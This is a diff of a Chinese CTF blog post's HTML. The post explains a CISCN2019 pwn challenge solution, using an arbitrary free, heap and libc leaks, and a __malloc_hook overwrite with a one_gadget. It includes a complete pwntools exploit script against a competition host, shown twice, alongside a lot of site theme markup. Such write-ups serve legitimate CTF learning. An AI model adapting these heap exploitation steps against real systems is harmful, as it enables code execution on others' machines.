 <p>之前输入的<code>root</code>判断字符串可以正好覆盖到<code>ptr</code>。所以相当于任意地址<code>free</code>。</p>
 <p>所以先泄露<code>heap</code>和<code>libc</code>，然后任意地址<code>free</code>构造<code>UAF</code>，来写<code>__malloc_hook</code>为<code>one_gadget</code>。</p>
 <p>然后接着用任意地址<code>free</code>来触发<code>double free</code>错误触发<code>malloc</code>即可。</p>
-<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span> , os = <span class="string">'linux'</span>, log_level=<span class="string">"debug"</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#proc_base = p.libs()[p._cwd+p.argv[0].strip('.')]</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"10.50.1.2"</span>, <span class="number">10006</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./lib'</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b) </span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line">slog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">flog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">""</span>)</span>:</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span><span class="params">(passwd)</span>:</span></span><br><span class="line">	sla(<span class="string">'passwd:'</span>, passwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(size, ctx)</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">	root(<span class="string">"t1an5t"</span>)</span><br><span class="line">	sla(<span class="string">'size:'</span>, str(size))</span><br><span class="line">	sla(<span class="string">"Content:"</span>, ctx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">	root(<span class="string">"t1an5t"</span>)</span><br><span class="line">	sla(<span class="string">'index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx, passwd)</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">	root(passwd)</span><br><span class="line">	sla(<span class="string">'index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root2</span><span class="params">(passwd)</span>:</span></span><br><span class="line">	sa(<span class="string">'passwd:'</span>, passwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete2</span><span class="params">(idx, passwd)</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">	root2(passwd)</span><br><span class="line">	sla(<span class="string">'index:'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd = "set $a=%d\n" %(proc_base+0x202068)</span></span><br><span class="line"><span class="comment">#debug(cmd)</span></span><br><span class="line">New(<span class="number">0x20</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 0</span></span><br><span class="line">New(<span class="number">0x20</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 1</span></span><br><span class="line">New(<span class="number">0x100</span>, <span class="string">"t1an5t"</span>)  <span class="comment"># 2</span></span><br><span class="line">New(<span class="number">0x20</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">0</span>, <span class="string">"t1an5t"</span>)</span><br><span class="line">Delete(<span class="number">1</span>, <span class="string">"t1an5t"</span>)</span><br><span class="line">Delete(<span class="number">2</span>, <span class="string">"t1an5t"</span>)</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x20</span>, <span class="string">"a"</span>)   <span class="comment"># 0</span></span><br><span class="line">New(<span class="number">0x100</span>, <span class="string">"a"</span>)  <span class="comment"># 1</span></span><br><span class="line">list()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'0: '</span>)</span><br><span class="line">heap_leak = p.recvuntil(<span class="string">'\x0a'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">ru(<span class="string">"1: "</span>)</span><br><span class="line">libc_leak = p.recvuntil(<span class="string">'\x0a'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">heap_base = u64(heap_leak) <span class="number">-0x61</span></span><br><span class="line">libc_base = u64(libc_leak)- <span class="number">0x3c4b61</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x68</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 2</span></span><br><span class="line">New(<span class="number">0x68</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 4</span></span><br><span class="line">New(<span class="number">0x20</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">2</span>, <span class="string">"t1an5t"</span>)</span><br><span class="line">Delete(<span class="number">4</span>, <span class="string">"t1an5t"</span>)</span><br><span class="line">Delete2(<span class="number">20</span>, <span class="string">"\x00"</span> * <span class="number">0x20</span> + p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x68</span>, p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))   <span class="comment"># 2</span></span><br><span class="line">New(<span class="number">0x68</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 4</span></span><br><span class="line">New(<span class="number">0x68</span>, <span class="string">"t1an5t"</span>)   <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">New(<span class="number">0x68</span>, <span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">2</span>]))   <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">0</span>, <span class="string">"t1an5t"</span>)</span><br><span class="line">Delete2(<span class="number">20</span>, <span class="string">"\x00"</span> * <span class="number">0x20</span> + p64(heap_base+<span class="number">0xf0</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;, log_level=&quot;debug&quot;)
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
 
+#p = process(&#39;./pwn&#39;)
+#proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)]
+
+p = remote(&quot;10.50.1.2&quot;, 10006)
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;./lib&#39;)
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda   : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b) 
+sla = lambda a,b : p.sendlineafter(a, b)
+slog = lambda x : log.success(x)
+flog = lambda x : log.success(x)
+
+
+def debug(cmd=&quot;&quot;):
+    gdb.attach(p, cmd)
+
+
+def root(passwd):
+    sla(&#39;passwd:&#39;, passwd)
+
+
+def list():
+    sla(&quot;&gt;&gt; &quot;, &quot;1&quot;)
+
+
+def New(size, ctx):
+    sla(&quot;&gt;&gt; &quot;, &quot;2&quot;)
+    root(&quot;t1an5t&quot;)
+    sla(&#39;size:&#39;, str(size))
+    sla(&quot;Content:&quot;, ctx)
+
+
+def Edit(idx):
+    sla(&quot;&gt;&gt; &quot;, &quot;3&quot;)
+    root(&quot;t1an5t&quot;)
+    sla(&#39;index:&#39;, str(idx))
+
+
+def Delete(idx, passwd):
+    sla(&quot;&gt;&gt; &quot;, &quot;4&quot;)
+    root(passwd)
+    sla(&#39;index:&#39;, str(idx))
+
+
+def root2(passwd):
+    sa(&#39;passwd:&#39;, passwd)
+
+
+def Delete2(idx, passwd):
+    sla(&quot;&gt;&gt; &quot;, &quot;4&quot;)
+    root2(passwd)
+    sla(&#39;index:&#39;, str(idx))
+
+
+#cmd = &quot;set $a=%d\n&quot; %(proc_base+0x202068)
+#debug(cmd)
+New(0x20, &quot;t1an5t&quot;)   # 0
+New(0x20, &quot;t1an5t&quot;)   # 1
+New(0x100, &quot;t1an5t&quot;)  # 2
+New(0x20, &quot;t1an5t&quot;)   # 3
+
+Delete(0, &quot;t1an5t&quot;)
+Delete(1, &quot;t1an5t&quot;)
+Delete(2, &quot;t1an5t&quot;)
+
+New(0x20, &quot;a&quot;)   # 0
+New(0x100, &quot;a&quot;)  # 1
+list()
+
+ru(&#39;0: &#39;)
+heap_leak = p.recvuntil(&#39;\x0a&#39;, drop=True).ljust(8, &quot;\x00&quot;)
+ru(&quot;1: &quot;)
+libc_leak = p.recvuntil(&#39;\x0a&#39;, drop=True).ljust(8, &quot;\x00&quot;)
+
+heap_base = u64(heap_leak) -0x61
+libc_base = u64(libc_leak)- 0x3c4b61
+print hex(heap_base)
+print hex(libc_base)
+
+New(0x68, &quot;t1an5t&quot;)   # 2
+New(0x68, &quot;t1an5t&quot;)   # 4
+New(0x20, &quot;t1an5t&quot;)   # 5
+
+Delete(2, &quot;t1an5t&quot;)
+Delete(4, &quot;t1an5t&quot;)
+Delete2(20, &quot;\x00&quot; * 0x20 + p64(heap_base+0x260))
+
+New(0x68, p64(libc_base+libc.symbols[&#39;__malloc_hook&#39;]-0x23))   # 2
+New(0x68, &quot;t1an5t&quot;)   # 4
+New(0x68, &quot;t1an5t&quot;)   # 5
+
+one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+New(0x68, &quot;a&quot;*0x13+p64(libc_base+one[2]))   # 5
+
+Delete(0, &quot;t1an5t&quot;)
+Delete2(20, &quot;\x00&quot; * 0x20 + p64(heap_base+0xf0))
+p.interactive()
+</code></pre>
 
       
-
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1037178204@qq.com </span>
     </div>
-
-
-
-
-
-    <footer class="article-footer">
-      
-        <a data-url="http://tianstcht.github.io/CISCN2019-东北赛区线下赛-pwn/" data-id="ck2924knu0001tkvgt1zxrb6z" class="article-share-link" data-share="baidu" data-title="CISCN2019-东北赛区线下赛-pwn">分享到</a>
-      
-
-      
-        <a href="http://tianstcht.github.io/CISCN2019-东北赛区线下赛-pwn/#gitalk-container" class="article-comment-link">评论</a>
-      
-
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
-
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/KERNEL-CSAW-2010-kernel/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">← 上一篇</strong>
-      <div class="article-nav-title">KERNEL-CSAW-2010-kernel</div>
-    </a>
-  
-  
-    <a href="/pwn里的一些patch心得/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">下一篇 →</strong>
-      <div class="article-nav-title">
-        
-          pwn里的一些patch心得
-        
-      </div>
-    </a>
-  
-</nav>
-
-
-  
 </article>
 
 
 
-
-  <section class="comments">
-    <div id="disqus_thread">
-      <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    </div>
-  </section> 
-
-
-
-
-  <div id="gitalk-container"></div>
-
-
-</section>
-      
-      <aside   id="sidebar">
-  
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>CISCN2019-东北赛区线下赛-pwn</p>
     
-  <div class="widget-wrap">
-
-    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/NEX招新赛-pwn-writeup/">NEX招新赛-pwn-writeup</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/ByteCTF2019/">ByteCTF2019-PWN</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/glibc-malloc-c源码阅读笔记/">glibc-malloc.c源码阅读笔记</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/pwn里的一些patch心得/">pwn里的一些patch心得</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/CISCN2019-东北赛区线下赛-pwn/">CISCN2019-东北赛区线下赛-pwn</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-tasks"></i>分类</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/glibc/">glibc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/kernel/">kernel</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwnable/">pwnable</a><span class="category-list-count">3</span></li></ul>
-    </div>
-  </div>
-
-
-  <script>
-  $(document).on("click", "ul.category-list li.category-list-item", function () {
-    window.location.href = $(this).find('a').attr('href')
-  })
-  </script>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-cloud"></i>标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/2019/" style="font-size: 13.33px;">2019</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/glibc/" style="font-size: 10px;">glibc</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/malloc/" style="font-size: 10px;">malloc</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-tw/" style="font-size: 10px;">pwnable.tw</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-archive"></i>归档</h3>
-    <div class="widget">
-      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">一月 1999</a><span class="archive-list-count">1</span></li></ul> -->
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">1999年01月</a><span class="archive-list-count">1</span></li></ul>
-    </div>
-  </div>
-
-
-<script>
-$(document).on("click", "ul.archive-list li.archive-list-item", function () {
-  window.location.href = $(this).find('a').attr('href')
-})
-</script>
-
-  
-    
-  <style>
-  *{ margin: 0; padding: 0;}
-  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
-  .tooltips p.content{ padding: 5px; }
-  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
-  .tooltips .triangle-back{ margin-top: -1px;}
-
-  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
-  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
-  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}
-
-
-  .icoSize{font-size: 2em}
-  </style>
-
-
-
-  <div class="widget-wrap">
-    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-link"></i>链接</h3>
-    <div class="widget" style="z-index: 1;">
-
-
-
-
-
-      <!-- <ul> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank"  href="https://github.com/tianstcht">
-                      <span class="fa-stack fa-lg">
-                          <i class="fa fa-circle fa-stack-2x"></i>
-                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
-                      </span>
-                  </a>
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-                  <a id="zhihu-icon-color" class="weight-icon-link" target="_blank" href="https://www.zhihu.com/people/T1an5t">
-                      <span class="fa-stack fa-lg">
-                          <i class="fa fa-circle fa-stack-2x"></i>
-                          <i class="fa  fa-stack-1x fa-inverse">知</i>
-                      </span>
-                  </a>
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-            <a id="weixin-icon-color" class="weight-icon-link"  href="javascript:;"   id="weixin-icon" target="_blank" tooltips="<img src='tianst19970828'>">
-                <span class="fa-stack fa-lg">
-                      <i class="fa fa-circle fa-stack-2x"></i>
-                      <i class="fa fa-weixin  fa-stack-1x fa-inverse"></i>
-                  </span>
-              </a>
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-            <a id="qq-icon-color" class="weight-icon-link"  href="javascript:;"   id="qq-icon" target="_blank" tooltips="<img src='1037178204'>">
-                <span class="fa-stack fa-lg">
-                      <i class="fa fa-circle fa-stack-2x"></i>
-                      <i class="fa fa-qq  fa-stack-1x fa-inverse"></i>
-                  </span>
-              </a>
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank"  href="1037178204@qq.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
-                  <span class="fa-stack fa-lg">
-                          <i class="fa fa-circle fa-stack-2x"></i>
-                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
-                      </span>
-                  </a>
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-          <!-- <li> -->
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-
-
-          
-
-          
-
-
-          <!-- </li> -->
-        
-      <!-- </ul> -->
-    </div>
-  </div>
-
-
-  <script>
-  $.fn.extend({
-    hoverTips : function (){
-      var self = $(this);
-      var sw = self.get(0).switch;
-      if( !sw ) {
-        sw = true;
-        var content = self.attr("tooltips");
-        var htmlDom = $("<div class='tooltips'>")
-            .addClass("toolTipInfo")
-            .html("<p class='content'></p>"
-                + "<p class='triangle-front'></p>"
-                + "<p class='triangle-back'></p>");
-        htmlDom.find("p.content").html( content );
-      }
-      self.on("mouseover",function(){
-        $("body").append( htmlDom );
-        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
-        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
-        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
-        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
-      });
-      self.on("mouseout",function(){
-        var top = parseInt(htmlDom.css("top"));
-        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
-          htmlDom.remove();
-          sw = false;
-        });
-      });
-    },
-
-  });
-
-  $("#weixin-icon-color").hoverTips();
-  $("#qq-icon-color").hoverTips();
-  </script>
-
-
-
-  
-    
-    <div class="widget-wrap">
-  
-      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友链</h3>
-      <div class="widget">
-        <ul>
-        
-        </ul>
-      </div>
-    </div>
-  
-  
-  
-</aside>
-
-      
-    </div>
-    <footer  id="footer">
-  
-  <div  data-scroll-reveal="enter bottom"  class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2019 t1an5t<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-      .
-      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
-    </div>
-
-    <div id="footer-info" class="inner">
-        <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-      <span id="busuanzi_container_site_pv"> 访问量
-      <font color="#FF3030"><i class="fa fa-heartbeat"></i></i></font>
-      <span id="busuanzi_value_site_pv"></span>次</span>
-
-      <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1257415698'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1257415698%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
-
-    </div>
-  </div>
-
-</footer>
-
-  </div>
-  <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
-  
-    <a href="/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
-  
-    <a href="/about_me.html" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
-  
-</nav>
-
-  <!-- totop start -->
-<div id="totop">
-<a title="返回顶部"><img src="/img/betop.png"/></a>
+    <p><span class="copy-title">本文作者:</span><a  title="t1an5t">t1an5t</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-06-23, 21:13:37</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-05, 20:50:48</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/CISCN2019-东北赛区线下赛-pwn/" title="CISCN2019-东北赛区线下赛-pwn">http://tianstcht.github.io/CISCN2019-东北赛区线下赛-pwn/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
 </div>
 
-<!-- totop end -->
 
 
 
-  <script>
-    var disqus_shortname = 'rapcoder';
-    if (page.permalink){ 
-      var disqus_url = 'http://tianstcht.github.io/CISCN2019-东北赛区线下赛-pwn/';
-     } 
-    (function(){
-      var dsq = document.createElement('script');
-      dsq.type = 'text/javascript';
-      dsq.async = true;
-      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-  </script>
 
-
-
-<!-- 百度分享 start -->
-
-<div id="article-share-box" class="article-share-box">
-  <div id="bdshare" class="bdsharebuttonbox article-share-links">
-    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
-    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
-    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
-    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
-    <a class="article-share-more" data-cmd="more" title="更多"></a>
-  </div>
-</div>
-<script>
-  function SetShareData(cmd, config) {
-    if (shareDataTitle && shareDataUrl) {
-      config.bdText = shareDataTitle;
-      config.bdUrl = shareDataUrl;
-    }
-    return config;
-  }
-  window._bd_share_config={
-    "common":{onBeforeClick: SetShareData},
-    "share":{"bdCustomStyle":"/css/bdshare.css"}
-  };
-  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
-</script>
-
-<!-- 百度分享 end -->
-
-<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
-<script src="//cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>
-
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-<! -- mathjax config similar to math.stackexchange -->
-
-<script type="text/x-mathjax-config">
-MathJax.Hub.Config({
-tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-                processEscapes: true
-                    
-}
-  
-        });
-</script>
-
-<script type="text/x-mathjax-config">
-MathJax.Hub.Config({
-tex2jax: {
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-                  
-}
     
-        });
-</script>
-
-<script type="text/x-mathjax-config">
-MathJax.Hub.Queue(function() {
-            var all = MathJax.Hub.getAllJax(), i;
-            for(i=0; i < all.length; i += 1) {
-                            all[i].SourceElement().parentNode.className += ' has-jax';
-                                    
-            }
-                
-        });
-</script>
-
-<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
 
 
-<script src="/js/script.js"></script>
 
 
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 t1an5t</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
 </div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
 </body>
-</html>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
 
-
-
-<div class="site-search">
-  <div class="algolia-popup popup">
-    <div class="algolia-search">
-      <div class="algolia-search-input-icon">
-        <i class="fa fa-search"></i>
-      </div>
-      <div class="algolia-search-input" id="algolia-search-input"></div>
-    </div>
-    <div class="algolia-results">
-      <div id="algolia-stats"></div>
